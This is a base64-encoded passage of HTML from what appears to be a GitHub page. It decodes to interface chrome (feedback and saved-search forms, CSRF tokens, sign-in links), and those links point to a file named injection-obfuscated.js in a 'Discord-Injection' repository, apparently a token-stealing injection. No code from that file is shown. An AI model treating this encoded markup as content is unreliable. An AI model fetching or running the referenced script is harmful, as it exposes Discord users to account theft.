HQtY2hhcnNldD0iVVRGLTgiIG1ldGhvZD0icG9zdCI+PGlucHV0IHR5cGU9ImhpZGRlbiIgZGF0YS1jc3JmPSJ0cnVlIiBuYW1lPSJhdXRoZW50aWNpdHlfdG9rZW4iIHZhbHVlPSJuT0dLVGExZWpFai9YeHFNRmJCS0NWZlJMNFRCeTBoTkZEUnhhWHFHT3ppaCtoM25sMXpOdXZub2crQlB3ZXhYMFdzbTZYaXh0V0ZtcS9LU0Mxb2hIQT09IiAvPgogICAgICAgICAgPHA+V2UgcmVhZCBldmVyeSBwaWVjZSBvZiBmZWVkYmFjaywgYW5kIHRha2UgeW91ciBpbnB1dCB2ZXJ5IHNlcmlvdXNseS48L3A+CiAgICAgICAgICA8dGV4dGFyZWEgbmFtZT0iZmVlZGJhY2siIGNsYXNzPSJmb3JtLWNvbnRyb2wgd2lkdGgtZnVsbCBtYi0yIiBzdHlsZT0iaGVpZ2h0OiAxMjBweCIgaWQ9ImZlZWRiYWNrIj48L3RleHRhcmVhPgogICAgICAgICAgPGlucHV0IG5hbWU9ImluY2x1ZGVfZW1haWwiIGlkPSJpbmNsdWRlX2VtYWlsIiBhcmlhLWxhYmVsPSJJbmNsdWRlIG15IGVtYWlsIGFkZHJlc3Mgc28gSSBjYW4gYmUgY29udGFjdGVkIiBjbGFzcz0iZm9ybS1jb250cm9sIG1yLTIiIHR5cGU9ImNoZWNrYm94Ij4KICAgICAgICAgIDxsYWJlbCBmb3I9ImluY2x1ZGVfZW1haWwiIHN0eWxlPSJmb250LXdlaWdodDogbm9ybWFsIj5JbmNsdWRlIG15IGVtYWlsIGFkZHJlc3Mgc28gSSBjYW4gYmUgY29udGFjdGVkPC9sYWJlbD4KPC9mb3JtPjwvZGl2PgogICAgICA8ZGl2IGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJPdmVybGF5LWZvb3RlciBPdmVybGF5LWZvb3Rlci0tYWxpZ25FbmQiPiAgICAgICAgICA8YnV0dG9uIGRhdGEtY2xvc2UtZGlhbG9nLWlkPSJmZWVkYmFjay1kaWFsb2ciIHR5cGU9ImJ1dHRvbiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9ImJ0biI+ICAgIENhbmNlbAo8L2J1dHRvbj4KICAgICAgICAgIDxidXR0b24gZm9ybT0iY29kZS1zZWFyY2gtZmVlZGJhY2stZm9ybSIgZGF0YS1hY3Rpb249ImNsaWNrOnFic2VhcmNoLWlucHV0I3N1Ym1pdEZlZWRiYWNrIiB0eXBlPSJzdWJtaXQiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJidG4tcHJpbWFyeSBidG4iPiAgICBTdWJtaXQgZmVlZGJhY2sKPC9idXR0b24+CjwvZGl2Pgo8L21vZGFsLWRpYWxvZz48L2Rpdj4KCiAgICA8Y3VzdG9tLXNjb3BlcyBkYXRhLXRhcmdldD0icWJzZWFyY2gtaW5wdXQuY3VzdG9tU2NvcGVzTWFuYWdlciI+CiAgICAKPGRpdiBjbGFzcz0iT3ZlcmxheS0taGlkZGVuIE92ZXJsYXktYmFja2Ryb3AtLWNlbnRlciIgZGF0YS1tb2RhbC1kaWFsb2ctb3ZlcmxheT4KICA8bW9kYWwtZGlhbG9nIGRhdGEtdGFyZ2V0PSJjdXN0b20tc2NvcGVzLmN1c3RvbVNjb3Blc01vZGFsRGlhbG9nIiBkYXRhLWFjdGlvbj0iY2xvc2U6cWJzZWFyY2gtaW5wdXQjaGFuZGxlRGlhbG9nQ2xvc2UgY2FuY2VsOnFic2VhcmNoLWlucHV0I2hhbmRsZURpYWxvZ0Nsb3NlIiByb2xlPSJkaWFsb2ciIGlkPSJjdXN0b20tc2NvcGVzLWRpYWxvZyIgYXJpYS1tb2RhbD0idHJ1ZSIgYXJpYS1kaXNhYmxlZD0idHJ1ZSIgYXJpYS1sYWJlbGxlZGJ5PSJjdXN0b20tc2NvcGVzLWRpYWxvZy10aXRsZSIgYXJpYS1kZXNjcmliZWRieT0iY3VzdG9tLXNjb3Blcy1kaWFsb2ctZGVzY3JpcHRpb24iIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJPdmVybGF5IE92ZXJsYXktd2hlbk5hcnJvdyBPdmVybGF5LS1zaXplLW1lZGl1bSBPdmVybGF5LS1tb3Rpb24tc2NhbGVGYWRlIj4KICAgIDxkaXYgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Ik92ZXJsYXktaGVhZGVyIE92ZXJsYXktaGVhZGVyLS1kaXZpZGVkIj4KICA8ZGl2IGNsYXNzPSJPdmVybGF5LWhlYWRlckNvbnRlbnRXcmFwIj4KICAgIDxkaXYgY2xhc3M9Ik92ZXJsYXktdGl0bGVXcmFwIj4KICAgICAgPGgxIGNsYXNzPSJPdmVybGF5LXRpdGxlICIgaWQ9ImN1c3RvbS1zY29wZXMtZGlhbG9nLXRpdGxlIj4KICAgICAgICBTYXZlZCBzZWFyY2hlcwogICAgICA8L2gxPgogICAgICAgIDxoMiBpZD0iY3VzdG9tLXNjb3Blcy1kaWFsb2ctZGVzY3JpcHRpb24iIGNsYXNzPSJPdmVybGF5LWRlc2NyaXB0aW9uIj5Vc2Ugc2F2ZWQgc2VhcmNoZXMgdG8gZmlsdGVyIHlvdXIgcmVzdWx0cyBtb3JlIHF1aWNrbHk8L2gyPgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJPdmVybGF5LWFjdGlvbldyYXAiPgogICAgICA8YnV0dG9uIGRhdGEtY2xvc2UtZGlhbG9nLWlkPSJjdXN0b20tc2NvcGVzLWRpYWxvZyIgYXJpYS1sYWJlbD0iQ2xvc2UiIHR5cGU9ImJ1dHRvbiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9ImNsb3NlLWJ1dHRvbiBPdmVybGF5LWNsb3NlQnV0dG9uIj48c3ZnIGFyaWEtaGlkZGVuPSJ0cnVlIiBoZWlnaHQ9IjE2IiB2aWV3Qm94PSIwIDAgMTYgMTYiIHZlcnNpb249IjEuMSIgd2lkdGg9IjE2IiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0ib2N0aWNvbiBvY3RpY29uLXgiPgogICAgPHBhdGggZD0iTTMuNzIgMy43MmEuNzUuNzUgMCAwIDEgMS4wNiAwTDggNi45NGwzLjIyLTMuMjJhLjc0OS43NDkgMCAwIDEgMS4yNzUuMzI2Ljc0OS43NDkgMCAwIDEtLjIxNS43MzRMOS4wNiA4bDMuMjIgMy4yMmEuNzQ5Ljc0OSAwIDAgMS0uMzI2IDEuMjc1Ljc0OS43NDkgMCAwIDEtLjczNC0uMjE1TDggOS4wNmwtMy4yMiAzLjIyYS43NTEuNzUxIDAgMCAxLTEuMDQyLS4wMTguNzUxLjc1MSAwIDAgMS0uMDE4LTEuMDQyTDYuOTQgOCAzLjcyIDQuNzhhLjc1Ljc1IDAgMCAxIDAtMS4wNloiPjwvcGF0aD4KPC9zdmc+PC9idXR0b24+CiAgICA8L2Rpdj4KICA8L2Rpdj4KPC9kaXY+CiAgICAgIDxkaXYgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Ik92ZXJsYXktYm9keSI+ICAgICAgICA8ZGl2IGRhdGEtdGFyZ2V0PSJjdXN0b20tc2NvcGVzLmN1c3RvbVNjb3Blc01vZGFsRGlhbG9nRmxhc2giPjwvZGl2PgoKICAgICAgICA8ZGl2IGhpZGRlbiBjbGFzcz0iY3JlYXRlLWN1c3RvbS1zY29wZS1mb3JtIiBkYXRhLXRhcmdldD0iY3VzdG9tLXNjb3Blcy5jcmVhdGVDdXN0b21TY29wZUZvcm0iPgogICAgICAgIDwhLS0gJyJgIC0tPjwhLS0gPC90ZXh0YXJlYT48L3htcD4gLS0+PC9vcHRpb24+PC9mb3JtPjxmb3JtIGlkPSJjdXN0b20tc2NvcGVzLWRpYWxvZy1mb3JtIiBkYXRhLXR1cmJvPSJmYWxzZSIgYWN0aW9uPSIvc2VhcmNoL2N1c3RvbV9zY29wZXMiIGFjY2VwdC1jaGFyc2V0PSJVVEYtOCIgbWV0aG9kPSJwb3N0Ij48aW5wdXQgdHlwZT0iaGlkZGVuIiBkYXRhLWNzcmY9InRydWUiIG5hbWU9ImF1dGhlbnRpY2l0eV90b2tlbiIgdmFsdWU9IllLTzZoUDl4RXp6ams2a2h1RlhNWkFnaTcwR2Qya1B4VFZtbHNKcDlyM0ljMDVhZDRRLzRCUkxtbTRQb3hxeUVmSG5nRGdaRTl2cGgzWE1DQXZTV0VnPT0iIC8+CiAgICAgICAgICA8ZGl2IGRhdGEtdGFyZ2V0PSJjdXN0b20tc2NvcGVzLmN1c3RvbVNjb3Blc01vZGFsRGlhbG9nRmxhc2giPjwvZGl2PgoKICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPSJjdXN0b21fc2NvcGVfaWQiIG5hbWU9ImN1c3RvbV9zY29wZV9pZCIgZGF0YS10YXJnZXQ9ImN1c3RvbS1zY29wZXMuY3VzdG9tU2NvcGVzSWRGaWVsZCI+CgogICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CiAgICAgICAgICAgIDxsYWJlbCBmb3I9ImN1c3RvbV9zY29wZV9uYW1lIj5OYW1lPC9sYWJlbD4KICAgICAgICAgICAgPGF1dG8tY2hlY2sgc3JjPSIvc2VhcmNoL2N1c3RvbV9zY29wZXMvY2hlY2tfbmFtZSIgcmVxdWlyZWQ+CiAgICAgICAgICAgICAgPGlucHV0CiAgICAgICAgICAgICAgICB0eXBlPSJ0ZXh0IgogICAgICAgICAgICAgICAgbmFtZT0iY3VzdG9tX3Njb3BlX25hbWUiCiAgICAgICAgICAgICAgICBpZD0iY3VzdG9tX3Njb3BlX25hbWUiCiAgICAgICAgICAgICAgICBkYXRhLXRhcmdldD0iY3VzdG9tLXNjb3Blcy5jdXN0b21TY29wZXNOYW1lRmllbGQiCiAgICAgICAgICAgICAgICBjbGFzcz0iZm9ybS1jb250cm9sIgogICAgICAgICAgICAgICAgYXV0b2NvbXBsZXRlPSJvZmYiCiAgICAgICAgICAgICAgICBwbGFjZWhvbGRlcj0iZ2l0aHViLXJ1YnkiCiAgICAgICAgICAgICAgICByZXF1aXJlZAogICAgICAgICAgICAgICAgbWF4bGVuZ3RoPSI1MCI+CiAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgZGF0YS1jc3JmPSJ0cnVlIiB2YWx1ZT0iM0ljeEQzb0s5MU00Ry9pYW5kZ3lrZ2M2KzM5S01SUjVjaXRkajNjN3NEQjVaQThDNEVSdDhLdnFvL0pzbENLcDkvOEF4N2x2T3lZUzROUlI1WXdqeWc9PSIgLz4KICAgICAgICAgICAgPC9hdXRvLWNoZWNrPgogICAgICAgICAgPC9kaXY+CgogICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+CiAgICAgICAgICAgIDxsYWJlbCBmb3I9ImN1c3RvbV9zY29wZV9xdWVyeSI+UXVlcnk8L2xhYmVsPgogICAgICAgICAgICA8aW5wdXQKICAgICAgICAgICAgICB0eXBlPSJ0ZXh0IgogICAgICAgICAgICAgIG5hbWU9ImN1c3RvbV9zY29wZV9xdWVyeSIKICAgICAgICAgICAgICBpZD0iY3VzdG9tX3Njb3BlX3F1ZXJ5IgogICAgICAgICAgICAgIGRhdGEtdGFyZ2V0PSJjdXN0b20tc2NvcGVzLmN1c3RvbVNjb3Blc1F1ZXJ5RmllbGQiCiAgICAgICAgICAgICAgY2xhc3M9ImZvcm0tY29udHJvbCIKICAgICAgICAgICAgICBhdXRvY29tcGxldGU9Im9mZiIKICAgICAgICAgICAgICBwbGFjZWhvbGRlcj0iKHJlcG86bW9uYS9hIE9SIHJlcG86bW9uYS9iKSBBTkQgbGFuZzpweXRob24iCiAgICAgICAgICAgICAgcmVxdWlyZWQKICAgICAgICAgICAgICBtYXhsZW5ndGg9IjUwMCI+CiAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICA8cCBjbGFzcz0idGV4dC1zbWFsbCBjb2xvci1mZy1tdXRlZCI+CiAgICAgICAgICAgIFRvIHNlZSBhbGwgYXZhaWxhYmxlIHF1YWxpZmllcnMsIHNlZSBvdXIgPGEgY2xhc3M9IkxpbmstLWluVGV4dEJsb2NrIiBocmVmPSJodHRwczovL2RvY3MuZ2l0aHViLmNvbS9lbi9zZWFyY2gtZ2l0aHViL2dpdGh1Yi1jb2RlLXNlYXJjaC91bmRlcnN0YW5kaW5nLWdpdGh1Yi1jb2RlLXNlYXJjaC1zeW50YXgiPmRvY3VtZW50YXRpb248L2E+LgogICAgICAgICAgPC9wPgo8L2Zvcm0+ICAgICAgICA8L2Rpdj4KCiAgICAgICAgPGRpdiBkYXRhLXRhcmdldD0iY3VzdG9tLXNjb3Blcy5tYW5hZ2VDdXN0b21TY29wZXNGb3JtIj4KICAgICAgICAgIDxkaXYgZGF0YS10YXJnZXQ9ImN1c3RvbS1zY29wZXMubGlzdCI+PC9kaXY+CiAgICAgICAgPC9kaXY+Cgo8L2Rpdj4KICAgICAgPGRpdiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0iT3ZlcmxheS1mb290ZXIgT3ZlcmxheS1mb290ZXItLWFsaWduRW5kIE92ZXJsYXktZm9vdGVyLS1kaXZpZGVkIj4gICAgICAgICAgPGJ1dHRvbiBkYXRhLWFjdGlvbj0iY2xpY2s6Y3VzdG9tLXNjb3BlcyNjdXN0b21TY29wZXNDYW5jZWwiIHR5cGU9ImJ1dHRvbiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9ImJ0biI+ICAgIENhbmNlbAo8L2J1dHRvbj4KICAgICAgICAgIDxidXR0b24gZm9ybT0iY3VzdG9tLXNjb3Blcy1kaWFsb2ctZm9ybSIgZGF0YS1hY3Rpb249ImNsaWNrOmN1c3RvbS1zY29wZXMjY3VzdG9tU2NvcGVzU3VibWl0IiBkYXRhLXRhcmdldD0iY3VzdG9tLXNjb3Blcy5jdXN0b21TY29wZXNTdWJtaXRCdXR0b24iIHR5cGU9InN1Ym1pdCIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9ImJ0bi1wcmltYXJ5IGJ0biI+ICAgIENyZWF0ZSBzYXZlZCBzZWFyY2gKPC9idXR0b24+CjwvZGl2Pgo8L21vZGFsLWRpYWxvZz48L2Rpdj4KICAgIDwvY3VzdG9tLXNjb3Blcz4KICA8L2Rpdj4KPC9xYnNlYXJjaC1pbnB1dD48aW5wdXQgdHlwZT0iaGlkZGVuIiBkYXRhLWNzcmY9InRydWUiIGNsYXNzPSJqcy1kYXRhLWp1bXAtdG8tc3VnZ2VzdGlvbnMtcGF0aC1jc3JmIiB2YWx1ZT0iMTlod04vM2ZwbEw5STlpOGlRVkxSOERGK2ltWWpDa1NMTlJtTUl4WkhLNFpBWkFZaC9hZFJ0NGN2Y3E5ZC84NUlhK0pHbkExbnBaRExGR21vdDJWdGc9PSIgLz4KCgogICAgICAgICAgPGRpdiBjbGFzcz0icG9zaXRpb24tcmVsYXRpdmUgbXItbGctMyBkLWxnLWlubGluZS1ibG9jayI+CiAgICAgICAgICAgIDxhIGhyZWY9Ii9sb2dpbj9yZXR1cm5fdG89aHR0cHMlM0ElMkYlMkZnaXRodWIuY29tJTJGc2tvY2h3YXNoZXJlJTJGRGlzY29yZC1JbmplY3Rpb24lMkZibG9iJTJGbWFpbiUyRmluamVjdGlvbi1vYmZ1c2NhdGVkLmpzIgogICAgICAgICAgICAgIGNsYXNzPSJIZWFkZXJNZW51LWxpbmsgSGVhZGVyTWVudS1saW5rLS1zaWduLWluIGZsZXgtc2hyaW5rLTAgbm8tdW5kZXJsaW5lIGQtYmxvY2sgZC1sZy1pbmxpbmUtYmxvY2sgYm9yZGVyIGJvcmRlci1sZy0wIHJvdW5kZWQgcm91bmRlZC1sZy0wIHAtMiBwLWxnLTAiCiAgICAgICAgICAgICAgZGF0YS1oeWRyby1jbGljaz0ieyZxdW90O2V2ZW50X3R5cGUmcXVvdDs6JnF1b3Q7YXV0aGVudGljYXRpb24uY2xpY2smcXVvdDssJnF1b3Q7cGF5bG9hZCZxdW90Ozp7JnF1b3Q7bG9jYXRpb25faW5fcGFnZSZxdW90OzomcXVvdDtzaXRlIGhlYWRlciBtZW51JnF1b3Q7LCZxdW90O3JlcG9zaXRvcnlfaWQmcXVvdDs6bnVsbCwmcXVvdDthdXRoX3R5cGUmcXVvdDs6JnF1b3Q7U0lHTl9VUCZxdW90OywmcXVvdDtvcmlnaW5hdGluZ191cmwmcXVvdDs6JnF1b3Q7aHR0cHM6Ly9naXRodWIuY29tL3Nrb2Nod2FzaGVyZS9EaXNjb3JkLUluamVjdGlvbi9ibG9iL21haW4vaW5qZWN0aW9uLW9iZnVzY2F0ZWQuanMmcXVvdDssJnF1b3Q7dXNlcl9pZCZxdW90OzpudWxsfX0iIGRhdGEtaHlkcm8tY2xpY2staG1hYz0iZGM4YmIzM2YzYTViODcxZDQxYjNjYTFlZWU3YzUyZjIyZmFhNzhkODAxMmJkYTg0MTU2ZTg3ZTM4Y2Y5OGZiMyIKICAgICAgICAgICAgICBkYXRhLWdhLWNsaWNrPSIoTG9nZ2VkIG91dCkgSGVhZGVyLCBjbGlja2VkIFNpZ24gaW4sIHRleHQ6c2lnbi1pbiI+CiAgICAgICAgICAgICAgU2lnbiBpbgogICAgICAgICAgICA8L2E+CiAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgIDxhIGhyZWY9Ii9zaWdudXA/cmVmX2N0YT1TaWduK3VwJmFtcDtyZWZfbG9jPWhlYWRlcitsb2dnZWQrb3V0JmFtcDtyZWZfcGFnZT0lMkYlM0N1c2VyLW5hbWUlM0UlMkYlM0NyZXBvLW5hbWUlM0UlMkZibG9iJTJGc2hvdyZhbXA7c291cmNlPWhlYWRlci1yZXBvJmFtcDtzb3VyY2VfcmVwbz1za29jaHdhc2hlcmUlMkZEaXNjb3JkLUluamVjdGlvbiIKICAgICAgICAgICAgICBjbGFzcz0iSGVhZGVyTWVudS1saW5rIEhlYWRlck1lbnUtbGluay0tc2lnbi11cCBmbGV4LXNocmluay0wIGQtbm9uZSBkLWxnLWlubGluZS1ibG9jayBuby11bmRlcmxpbmUgYm9yZGVyIGNvbG9yLWJvcmRlci1kZWZhdWx0IHJvdW5kZWQgcHgtMiBweS0xIgogICAgICAgICAgICAgIGRhdGEtaHlkcm8tY2xpY2s9InsmcXVvdDtldmVudF90eXBlJnF1b3Q7OiZxdW90O2F1dGhlbnRpY2F0aW9uLmNsaWNrJnF1b3Q7LCZxdW90O3BheWxvYWQmcXVvdDs6eyZxdW90O2xvY2F0aW9uX2luX3BhZ2UmcXVvdDs6JnF1b3Q7c2l0ZSBoZWFkZXIgbWVudSZxdW90OywmcXVvdDtyZXBvc2l0b3J5X2lkJnF1b3Q7Om51bGwsJnF1b3Q7YXV0aF90eXBlJnF1b3Q7OiZxdW90O1NJR05fVVAmcXVvdDssJnF1b3Q7b3JpZ2luYXRpbmdfdXJsJnF1b3Q7OiZxdW90O2h0dHBzOi8vZ2l0aHViLmNvbS9za29jaHdhc2hlcmUvRGlzY29yZC1JbmplY3Rpb24vYmxvYi9tYWluL2luamVjdGlvbi1vYmZ1c2NhdGVkLmpzJnF1b3Q7LCZxdW90O3VzZXJfaWQmcXVvdDs6bnVsbH19IiBkYXRhLWh5ZHJvLWNsaWNrLWhtYWM9ImRjOGJiMzNmM2E1Yjg3MWQ0MWIzY2ExZWVlN2M1MmYyMmZhYTc4ZDgwMTJiZGE4NDE1NmU4N2UzOGNmOThmYjMiCiAgICAgICAgICAgICAgZGF0YS1hbmFseXRpY3MtZXZlbnQ9InsmcXVvdDtjYXRlZ29yeSZxdW90OzomcXVvdDtTaWduIHVwJnF1b3Q7LCZxdW90O2FjdGlvbiZxdW90OzomcXVvdDtjbGljayB0byBzaWduIHVwIGZvciBhY2NvdW50JnF1b3Q7LCZxdW90O2xhYmVsJnF1b3Q7OiZxdW90O3JlZl9wYWdlOi8mbHQ7dXNlci1uYW1lJmd0Oy8mbHQ7cmVwby1uYW1lJmd0Oy9ibG9iL3Nob3c7cmVmX2N0YTpTaWduIHVwO3JlZl9sb2M6aGVhZGVyIGxvZ2dlZCBvdXQmcXVvdDt9IgogICAgICAgICAgICA+CiAgICAgICAgICAgICAgU2lnbiB1cAogICAgICAgICAgICA8L2E+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgPC9kaXY+CjwvaGVhZGVyPgoKICAgICAgPGRpdiBoaWRkZW49ImhpZGRlbiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9ImpzLXN0YWxlLXNlc3Npb24tZmxhc2ggc3RhbGUtc2Vzc2lvbi1mbGFzaCBmbGFzaCBmbGFzaC13YXJuIG1iLTMiPgogIAogICAgICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tYWxlcnQiPgogICAgPHBhdGggZD0iTTYuNDU3IDEuMDQ3Yy42NTktMS4yMzQgMi40MjctMS4yMzQgMy4wODYgMGw2LjA4MiAxMS4zNzhBMS43NSAxLjc1IDAgMCAxIDE0LjA4MiAxNUgxLjkxOGExLjc1IDEuNzUgMCAwIDEtMS41NDMtMi41NzVabTEuNzYzLjcwN2EuMjUuMjUgMCAwIDAtLjQ0IDBMMS42OTggMTMuMTMyYS4yNS4yNSAwIDAgMCAuMjIuMzY4aDEyLjE2NGEuMjUuMjUgMCAwIDAgLjIyLS4zNjhabS41MyAzLjk5NnYyLjVhLjc1Ljc1IDAgMCAxLTEuNSAwdi0yLjVhLjc1Ljc1IDAgMCAxIDEuNSAwWk05IDExYTEgMSAwIDEgMS0yIDAgMSAxIDAgMCAxIDIgMFoiPjwvcGF0aD4KPC9zdmc+CiAgICAgICAgPHNwYW4gY2xhc3M9ImpzLXN0YWxlLXNlc3Npb24tZmxhc2gtc2lnbmVkLWluIiBoaWRkZW4+WW91IHNpZ25lZCBpbiB3aXRoIGFub3RoZXIgdGFiIG9yIHdpbmRvdy4gPGEgY2xhc3M9IkxpbmstLWluVGV4dEJsb2NrIiBocmVmPSIiPlJlbG9hZDwvYT4gdG8gcmVmcmVzaCB5b3VyIHNlc3Npb24uPC9zcGFuPgogICAgICAgIDxzcGFuIGNsYXNzPSJqcy1zdGFsZS1zZXNzaW9uLWZsYXNoLXNpZ25lZC1vdXQiIGhpZGRlbj5Zb3Ugc2lnbmVkIG91dCBpbiBhbm90aGVyIHRhYiBvciB3aW5kb3cuIDxhIGNsYXNzPSJMaW5rLS1pblRleHRCbG9jayIgaHJlZj0iIj5SZWxvYWQ8L2E+IHRvIHJlZnJlc2ggeW91ciBzZXNzaW9uLjwvc3Bhbj4KICAgICAgICA8c3BhbiBjbGFzcz0ianMtc3RhbGUtc2Vzc2lvbi1mbGFzaC1zd2l0Y2hlZCIgaGlkZGVuPllvdSBzd2l0Y2hlZCBhY2NvdW50cyBvbiBhbm90aGVyIHRhYiBvciB3aW5kb3cuIDxhIGNsYXNzPSJMaW5rLS1pblRleHRCbG9jayIgaHJlZj0iIj5SZWxvYWQ8L2E+IHRvIHJlZnJlc2ggeW91ciBzZXNzaW9uLjwvc3Bhbj4KCiAgICA8ZGl2IGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJmbGFzaC1jbG9zZSI+CiAgPGJ1dHRvbiBpZD0iaWNvbi1idXR0b24tZWFiYTc5NzItZWRmNi00Nzk0LTllYzItMGZmOTdiMzE5ZDVmIiBhcmlhLWxhYmVsbGVkYnk9InRvb2x0aXAtODNmYmY1NjgtZjg5Ni00NjI1LWE3NWItNjk1Y2ZmYmIwMWNmIiB0eXBlPSJidXR0b24iIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJCdXR0b24gQnV0dG9uLS1pY29uT25seSBCdXR0b24tLWludmlzaWJsZSBCdXR0b24tLW1lZGl1bSBqcy1mbGFzaC1jbG9zZSI+ICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24teCBCdXR0b24tdmlzdWFsIj4KICAgIDxwYXRoIGQ9Ik0zLjcyIDMuNzJhLjc1Ljc1IDAgMCAxIDEuMDYgMEw4IDYuOTRsMy4yMi0zLjIyYS43NDkuNzQ5IDAgMCAxIDEuMjc1LjMyNi43NDkuNzQ5IDAgMCAxLS4yMTUuNzM0TDkuMDYgOGwzLjIyIDMuMjJhLjc0OS43NDkgMCAwIDEtLjMyNiAxLjI3NS43NDkuNzQ5IDAgMCAxLS43MzQtLjIxNUw4IDkuMDZsLTMuMjIgMy4yMmEuNzUxLjc1MSAwIDAgMS0xLjA0Mi0uMDE4Ljc1MS43NTEgMCAwIDEtLjAxOC0xLjA0Mkw2Ljk0IDggMy43MiA0Ljc4YS43NS43NSAwIDAgMSAwLTEuMDZaIj48L3BhdGg+Cjwvc3ZnPgo8L2J1dHRvbj4gIDx0b29sLXRpcCBpZD0idG9vbHRpcC04M2ZiZjU2OC1mODk2LTQ2MjUtYTc1Yi02OTVjZmZiYjAxY2YiIGZvcj0iaWNvbi1idXR0b24tZWFiYTc5NzItZWRmNi00Nzk0LTllYzItMGZmOTdiMzE5ZDVmIiBwb3BvdmVyPSJtYW51YWwiIGRhdGEtZGlyZWN0aW9uPSJzIiBkYXRhLXR5cGU9ImxhYmVsIiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0ic3Itb25seSBwb3NpdGlvbi1hYnNvbHV0ZSI+RGlzbWlzcyBhbGVydDwvdG9vbC10aXA+CjwvZGl2PgoKICAKPC9kaXY+CiAgICA8L2Rpdj4KCiAgPGRpdiBpZD0ic3RhcnQtb2YtY29udGVudCIgY2xhc3M9InNob3ctb24tZm9jdXMiPjwvZGl2PgoKCgoKCgoKCiAgICA8ZGl2IGlkPSJqcy1mbGFzaC1jb250YWluZXIiIGRhdGEtdHVyYm8tcmVwbGFjZT4KCgoKCgogIDx0ZW1wbGF0ZSBjbGFzcz0ianMtZmxhc2gtdGVtcGxhdGUiPgogICAgCjxkaXYgY2xhc3M9ImZsYXNoIGZsYXNoLWZ1bGwgICB7eyBjbGFzc05hbWUgfX0iPgogIDxkaXYgY2xhc3M9InB4LTIiID4KICAgIDxidXR0b24gYXV0b2ZvY3VzIGNsYXNzPSJmbGFzaC1jbG9zZSBqcy1mbGFzaC1jbG9zZSIgdHlwZT0iYnV0dG9uIiBhcmlhLWxhYmVsPSJEaXNtaXNzIHRoaXMgbWVzc2FnZSI+CiAgICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24teCI+CiAgICA8cGF0aCBkPSJNMy43MiAzLjcyYS43NS43NSAwIDAgMSAxLjA2IDBMOCA2Ljk0bDMuMjItMy4yMmEuNzQ5Ljc0OSAwIDAgMSAxLjI3NS4zMjYuNzQ5Ljc0OSAwIDAgMS0uMjE1LjczNEw5LjA2IDhsMy4yMiAzLjIyYS43NDkuNzQ5IDAgMCAxLS4zMjYgMS4yNzUuNzQ5Ljc0OSAwIDAgMS0uNzM0LS4yMTVMOCA5LjA2bC0zLjIyIDMuMjJhLjc1MS43NTEgMCAwIDEtMS4wNDItLjAxOC43NTEuNzUxIDAgMCAxLS4wMTgtMS4wNDJMNi45NCA4IDMuNzIgNC43OGEuNzUuNzUgMCAwIDEgMC0xLjA2WiI+PC9wYXRoPgo8L3N2Zz4KICAgIDwvYnV0dG9uPgogICAgPGRpdiBhcmlhLWF0b21pYz0idHJ1ZSIgcm9sZT0iYWxlcnQiIGNsYXNzPSJqcy1mbGFzaC1hbGVydCI+CiAgICAgIAogICAgICA8ZGl2Pnt7IG1lc3NhZ2UgfX08L2Rpdj4KCiAgICA8L2Rpdj4KICA8L2Rpdj4KPC9kaXY+CiAgPC90ZW1wbGF0ZT4KPC9kaXY+CgoKICAgIAogICAgPGluY2x1ZGUtZnJhZ21lbnQgY2xhc3M9ImpzLW5vdGlmaWNhdGlvbi1zaGVsZi1pbmNsdWRlLWZyYWdtZW50IiBkYXRhLWJhc2Utc3JjPSJodHRwczovL2dpdGh1Yi5jb20vbm90aWZpY2F0aW9ucy9iZXRhL3NoZWxmIj48L2luY2x1ZGUtZnJhZ21lbnQ+CgoKCgoKCiAgPGRpdgogICAgY2xhc3M9ImFwcGxpY2F0aW9uLW1haW4gIgogICAgZGF0YS1jb21taXQtaG92ZXJjYXJkcy1lbmFibGVkCiAgICBkYXRhLWRpc2N1c3Npb24taG92ZXJjYXJkcy1lbmFibGVkCiAgICBkYXRhLWlzc3VlLWFuZC1wci1ob3ZlcmNhcmRzLWVuYWJsZWQKICA+CiAgICAgICAgPGRpdiBp